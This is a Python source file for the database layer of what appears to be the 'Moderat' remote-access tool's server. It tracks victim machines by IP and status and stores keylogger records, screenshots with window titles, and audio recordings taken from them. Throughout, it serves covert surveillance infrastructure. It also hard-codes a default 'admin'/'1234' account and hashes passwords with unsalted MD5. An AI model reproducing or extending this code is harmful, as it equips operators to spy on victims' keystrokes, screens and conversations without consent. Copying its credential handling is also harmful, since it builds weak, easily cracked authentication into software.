import sqlite3
import hashlib
import datetime


class MDB:

    def __init__(self):

        self.conn = sqlite3.connect('ModeratServer.db')
        self.cur = self.conn.cursor()

        self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Audio"')
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.create_audio_table()

        self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Keylogger"')
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.create_keylogger_table()

        self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Screenshots"')
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.create_screenshots_table()

        self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Note"')
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.create_note_table()

        self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Moderators"')
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.create_moderators_table()
            MDB().create_user('admin', '1234', 1)
            print '[+] First Run. Administrator Account Created (username:admin, password:1234)'

        self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Clients"')
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.create_clients_table()

    def set_client_status_zero(self):
        self.cur.execute('UPDATE Clients SET client_status=0')
        self.conn.commit()

    def create_clients_table(self):
        self.cur.execute('''CREATE TABLE Clients (
                                  moderator_id VARCHAR(100),
                                  client_id VARCHAR(100),
                                  client_alias VARCHAR(100),
                                  client_ip VARCHAR(100),
                                  last_connected DATETIME(100),
                                  client_status INTEGER(10))'''),
        self.conn.commit()

    def get_alias(self, client_id):
        self.cur.execute('SELECT client_alias FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def get_ip_address(self, client_id):
        self.cur.execute('SELECT client_ip FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def get_last_online(self, client_id):
        self.cur.execute('SELECT last_connected FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def set_alias(self, client_id, client_alias):
        self.cur.execute('UPDATE Clients SET client_alias=? WHERE client_id=?', (client_alias, client_id))
        self.conn.commit()
        return 'Success'

    def set_moderator(self, client_id, moderator_id):
        self.cur.execute('UPDATE Clients SET moderator_id=? WHERE client_id=?', (moderator_id, client_id))
        self.conn.commit()
        return 'Success'

    def create_client(self, moderator_id, client_id, client_ip):
        self.cur.execute('SELECT * FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.cur.execute('INSERT INTO Clients VALUES (?,?,?,?,?,?)',
                             (moderator_id, client_id, '', client_ip, datetime.datetime.now(), 1))
            self.conn.commit()
            return True
        else:
            return False

    def get_clients(self, moderator_id):
        self.cur.execute('SELECT client_id FROM Clients WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        return self.cur.fetchall()

        # Administrator Query

    def get_all_clients(self):
        self.cur.execute('SELECT client_id FROM Clients')
        self.conn.commit()
        return self.cur.fetchall()

    def set_client_online(self, client_id):
        self.cur.execute('UPDATE Clients SET client_status=1 WHERE client_id=?', (client_id,))
        self.conn.commit()

    def set_client_offline(self, client_id):
        self.cur.execute('SELECT * FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) != 0:
            self.cur.execute('UPDATE Clients SET client_status=0 WHERE client_id=?', (client_id,))
            self.conn.commit()

    def delete_client(self, client_id):
        self.cur.execute('DELETE FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()

    def is_online(self, client_id):
        self.cur.execute('SELECT client_status FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        return self.cur.fetchall()[0] == 1

    def get_offline_clients(self, moderator_id):
        self.cur.execute('SELECT * FROM Clients WHERE moderator_id=? AND client_status=0',
                                         (moderator_id,))
        self.conn.commit()
        return self.cur.fetchall()

    def get_all_offline_clients(self):
        self.cur.execute('SELECT * FROM Clients WHERE client_status=0')
        self.conn.commit()
        return self.cur.fetchall()

    def get_moderator(self, client_id):
        self.cur.execute('SELECT moderator_id FROM Clients WHERE client_id=?', (client_id,))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def create_moderators_table(self):
        self.cur.execute('''CREATE TABLE Moderators (
                                        moderator_id VARCHAR(100),
                                         moderator_password VARCHAR(100),
                                         moderator_privs INTEGER(10),
                                         moderator_status INTEGER DEFAULT 0,
                                         moderator_last_online DATETIME(100))''')
        self.conn.commit()

    def set_moderator_status_zero(self):
        self.cur.execute('UPDATE Moderators SET moderator_status=0')
        self.conn.commit()

    def create_user(self, moderator_id, moderator_password, moderator_privs):
        password_hash = hashlib.md5()
        password_hash.update(moderator_password)
        self.cur.execute('SELECT * FROM Moderators WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            self.cur.execute('INSERT INTO Moderators VALUES (?,?,?,?,?)',
                             (moderator_id, password_hash.hexdigest(), moderator_privs, 0, datetime.datetime.now()))
            self.conn.commit()
            return True
        else:
            return False

    def login_user(self, moderator_id, moderator_password):
        self.cur.execute('SELECT * FROM Moderators WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            return False
        else:
            password_hash = hashlib.md5()
            password_hash.update(moderator_password)
            self.cur.execute('SELECT moderator_password FROM Moderators WHERE moderator_id=?',
                                                (moderator_id,))
            self.conn.commit()
            if self.cur.fetchone()[0] == password_hash.hexdigest():
                return True
            else:
                return False

    def change_password(self, moderator_id, new_password):
        self.cur.execute('SELECT * FROM Moderators WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            return False
        else:
            generate_hash = hashlib.md5()
            generate_hash.update(new_password)
            self.cur.execute('UPDATE Moderators SET moderator_password=? WHERE moderator_id=?',
                             (generate_hash.hexdigest(), moderator_id))
            self.conn.commit()
            return True

    def change_privileges(self, moderator_id, status):
        self.cur.execute('SELECT * FROM Moderators WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            return False
        else:
            self.cur.execute('UPDATE Moderators SET moderator_privs=? WHERE moderator_id=?', (status, moderator_id))
            self.conn.commit()
            return True

    def delete_user(self, moderator_id):
        self.cur.execute('SELECT * FROM Moderators WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            return False
        else:
            self.cur.execute('DELETE FROM Moderators WHERE moderator_id=?', (moderator_id,))
            self.conn.commit()
            return True

    def get_privs(self, moderator_id):
        self.cur.execute('SELECT * FROM Moderators WHERE moderator_id=?', (moderator_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) == 0:
            return False
        else:
            self.cur.execute('SELECT moderator_privs FROM Moderators WHERE moderator_id=?', (moderator_id,))
            self.conn.commit()
            return self.cur.fetchone()[0]

    def set_last_online(self, moderator_id, date):
        self.cur.execute('UPDATE Moderators SET moderator_last_online=? WHERE moderator_id=?', (date, moderator_id))
        self.conn.commit()

    def set_status(self, moderator_id, status):
        self.cur.execute('UPDATE Moderators SET moderator_status=? WHERE moderator_id=?', (status, moderator_id))
        self.conn.commit()

    def get_moderators(self):
        self.cur.execute('SELECT * FROM Moderators')
        self.conn.commit()
        return self.cur.fetchall()

    def create_note_table(self):
        self.cur.execute('''CREATE TABLE Note (
                                        note_client_id VARCHAR(100),
                                        note_body VARCHAR(100000))
        ''')
        self.conn.commit()


    def save_note(self, client_id, note_body):
        self.cur.execute('SELECT * FROM Note WHERE note_client_id=?', (client_id,))
        self.conn.commit()
        if len(self.cur.fetchall()) != 0:
            self.cur.execute('UPDATE Note SET note_body=? WHERE note_client_id=?', (note_body, client_id,))
            self.conn.commit()
        else:
            self.cur.execute('INSERT INTO Note VALUES (?,?)', (client_id, note_body))
            self.conn.commit()

    def get_note(self, client_id):
        self.cur.execute('SELECT note_body FROM Note WHERE note_client_id=?', (client_id,))
        self.conn.commit()
        data = self.cur.fetchone()
        if data:
            return data[0]
        else:
            return None

    def create_screenshots_table(self):
        self.cur.execute('''CREATE TABLE Screenshots (
                                        screenshot_client_id VARCHAR(100),
                                         screenshot_name VARCHAR(100),
                                         screenshot_path VARCHAR(100),
                                         screenshot_window_title VARCHAR(1000),
                                         screenshot_date VARCHAR(100),
                                         screenshot_status INTEGER)''')
        self.conn.commit()

    def save_image(self, client_id, screenshot_name, screenshot_path, window_title, date):
        self.cur.execute('INSERT INTO Screenshots VALUES (?,?,?,?,?,?)',
                         (client_id, screenshot_name, screenshot_path, window_title, date, 0))
        self.conn.commit()

    def get_screenshots_count_0(self, client_id, date):
        self.cur.execute(
            'SELECT COUNT(*) FROM Screenshots WHERE screenshot_client_id=? AND screenshot_date=? AND screenshot_status=0',
            (client_id, date))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def get_screenshots_count_1(self, client_id, date):
        self.cur.execute(
            'SELECT COUNT(*) FROM Screenshots WHERE screenshot_client_id=? AND screenshot_date=? AND screenshot_status=1',
            (client_id, date))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def get_all_new_screenshots(self, client_id, date, filt=0):
        self.cur.execute(
            'SELECT * FROM Screenshots WHERE screenshot_client_id=? AND screenshot_date=? AND screenshot_status=?',
            (client_id, date, filt))
        self.conn.commit()
        return self.cur.fetchall()

    def get_all_screenshots(self, client_id, date):
        self.cur.execute('SELECT * FROM Screenshots WHERE screenshot_client_id=? AND screenshot_date=?',
                                       (client_id, date,))
        self.conn.commit()
        return self.cur.fetchall()

    def delete_screenshot(self, datetime_stamp):
        self.cur.execute('DELETE FROM Screenshots WHERE screenshot_name=?', (datetime_stamp,))
        self.conn.commit()

    def set_screenshot_viewed(self, datetime_stamp):
        self.cur.execute('UPDATE Screenshots SET screenshot_status=1 WHERE screenshot_name=?', (datetime_stamp,))
        self.conn.commit()

    def create_keylogger_table(self):
        self.cur.execute('''CREATE TABLE Keylogger (
                                        keylogger_client_id VARCHAR(100),
                                         keylogger_datetime VARCHAR(100),
                                         keylogger_date VARCHAR(1000),
                                         keylogger_html_path VARCHAR(1000),
                                         keylogger_status VARCHAR(100))''')
        self.conn.commit()


    def save_keylog(self, client_id, datetime_stamp, html_path):
        self.cur.execute('INSERT INTO Keylogger VALUES (?,?,?,?,?)',
                         (client_id, datetime_stamp, datetime_stamp.split('_')[0], html_path, 0))
        self.conn.commit()


    def get_keylogs_count_0(self, client_id, date):
        self.cur.execute(
            'SELECT COUNT(*) FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=? AND keylogger_status=0',
            (client_id, date))
        self.conn.commit()
        return self.cur.fetchone()[0]


    def get_keylogs_count_1(self, client_id, date):
        self.cur.execute(
            'SELECT COUNT(*) FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=? AND keylogger_status=1',
            (client_id, date))
        self.conn.commit()
        return self.cur.fetchone()[0]


    def get_all_new_keylogs(self, client_id, date):
        self.cur.execute(
            'SELECT * FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=? AND keylogger_status=0',
            (client_id, date))
        self.conn.commit()
        return self.cur.fetchall()


    def get_all_keylogs(self, client_id, date):
        self.cur.execute('SELECT * FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=?',
                                   (client_id, date,))
        self.conn.commit()
        return self.cur.fetchall()


    def delete_keylog(self, datetime_stamp):
        self.cur.execute('DELETE FROM Keylogger WHERE keylogger_datetime=?', (datetime_stamp,))
        self.conn.commit()


    def set_keylog_viewed(self, datetime_stamp):
        self.cur.execute('UPDATE Keylogger SET keylogger_status=1 WHERE keylogger_datetime=?', (datetime_stamp,))
        self.conn.commit()

    def create_audio_table(self):
        self.cur.execute('''CREATE TABLE Audio (
                                audio_client_id VARCHAR(100),
                                 audio_datetime VARCHAR(100),
                                 audio_date VARCHAR(1000),
                                 audio_wav_path VARCHAR(1000),
                                 audio_status VARCHAR(100))''')
        self.conn.commit()

    def save_audio(self, client_id, datetime_stamp, wav_path):
        self.cur.execute('INSERT INTO Audio VALUES (?,?,?,?,?)', 
            (client_id, datetime_stamp, datetime_stamp.split('_')[0], wav_path, 0))
        self.conn.commit()

    def get_audios_count_0(self, client_id, date):
        self.cur.execute('SELECT COUNT(*) FROM Audio WHERE audio_client_id=? AND audio_date=? AND audio_status=0', (client_id, date))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def get_audios_count_1(self, client_id, date):
        self.cur.execute('SELECT COUNT(*) FROM Audio WHERE audio_client_id=? AND audio_date=? AND audio_status=1', (client_id, date))
        self.conn.commit()
        return self.cur.fetchone()[0]

    def get_all_new_audios(self, client_id, date):
        self.cur.execute('SELECT * FROM Audio WHERE audio_client_id=? AND audio_date=? AND audio_status=0', (client_id, date))
        self.conn.commit()
        return self.cur.fetchall()

    def get_all_audios(self, client_id, date):
        self.cur.execute('SELECT * FROM Audio WHERE audio_client_id=? AND audio_date=?', (client_id, date,))
        self.conn.commit()
        return self.cur.fetchall()

    def delete_audios(self, datetime_stamp):
        self.cur.execute('DELETE FROM Audio WHERE audio_datetime=?', (datetime_stamp,))
        self.conn.commit()

    def set_audio_viewed(self, datetime_stamp):
        self.cur.execute('UPDATE Audio SET audio_status=1 WHERE audio_datetime=?', (datetime_stamp,))
        self.conn.commit()